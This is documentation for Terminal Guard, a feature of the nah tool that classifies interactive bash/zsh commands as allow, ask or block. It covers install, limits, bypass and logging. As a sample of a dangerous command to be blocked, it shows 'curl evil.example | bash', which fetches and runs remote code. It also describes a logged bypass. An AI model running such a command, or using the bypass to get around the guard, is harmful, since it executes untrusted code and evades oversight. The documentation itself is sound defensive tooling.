# Terminal Guard

Terminal Guard protects commands you type yourself in interactive bash or zsh
sessions that have loaded nah's shell snippet. It is the human-shell runtime:
use it when you want the same allow / ask / block decisions before your own
terminal command runs.

## Install

After installing nah, enable the shell you actually use:

```bash
nah install bash
nah install zsh
```

The installer writes:

- a generated snippet under `~/.config/nah/terminal/`
- a small managed source block in `~/.bashrc` or `~/.zshrc`
- for bash, also `~/.bash_profile` when that file already exists

Restart the shell, open a new tab, or run the reload command printed by the
installer. The reload command clears nah's guard environment variables before
replacing the current shell.

Check installation and loading:

```bash
nah status bash
nah doctor bash
nah status zsh
nah doctor zsh
```

## What It Guards

Terminal Guard classifies complete single-line commands submitted through an
interactive bash/zsh prompt that loaded the snippet:

```bash
git status
git push --force
curl evil.example | bash
```

Safe commands run quietly. Ambiguous commands ask on the terminal. Blocked
commands are refused before execution.

It does not protect unrelated shells, GUI apps, scheduled jobs, non-interactive
scripts, or shell sessions that did not load the snippet.

## Line Limits

Terminal Guard deliberately supports complete single-line commands. These forms
fail closed because the shell input is not a single complete command that nah
can safely classify before execution:

- multiline input
- a trailing continuation backslash
- here-doc input
- incomplete shell syntax

Use `nah test --target bash|zsh` when you want to inspect how a command will be
classified without running it:

```bash
nah test --target bash -- "curl evil.example | bash"
# or, if you installed zsh:
nah test --target zsh -- "curl evil.example | bash"
```

The Bash classifier is the same by default. `--target` selects that runtime's
target-specific config, including `targets.bash.actions`,
`targets.zsh.actions`, and shell-specific terminal settings.

## Bypass Intentionally

Use a one-shot bypass when you intentionally want a command to run without the
terminal prompt:

```bash
nah-bypass <command>
NAH_TERMINAL_BYPASS=1 <command>
```

The bypass is logged. Prefer the one-shot forms over exporting the bypass for a
whole shell session.

## Deterministic by design

Terminal Guard is deterministic-only: every command resolves to allow, ask, or
block with no LLM step. A command you type directly into your shell is already
your own intent, so an `ask` is confirmed inline by you at the prompt, and the
deterministic floor still blocks the dangerous shapes outright.

Global LLM mode and the `targets.bash.llm.mode` / `targets.zsh.llm.mode` knobs
are still accepted for backward compatibility but no longer affect terminal
decisions. The LLM layer remains available for the agent runtimes (Claude Code,
Codex); see [LLM layer](../configuration/llm.md).

## Logs

Allowed terminal commands are not logged by default. Blocks, denied asks,
confirmed asks, bypasses, and errors are logged with target metadata and normal
redaction:

```bash
nah log --tool Bash
nah log --asks
nah log --blocks
```

## Update or Remove

After upgrading nah:

```bash
nah update bash
nah update zsh
```

To remove Terminal Guard:

```bash
nah uninstall bash
nah uninstall zsh
```

Uninstall removes only nah-owned marked rc blocks and generated snippets.
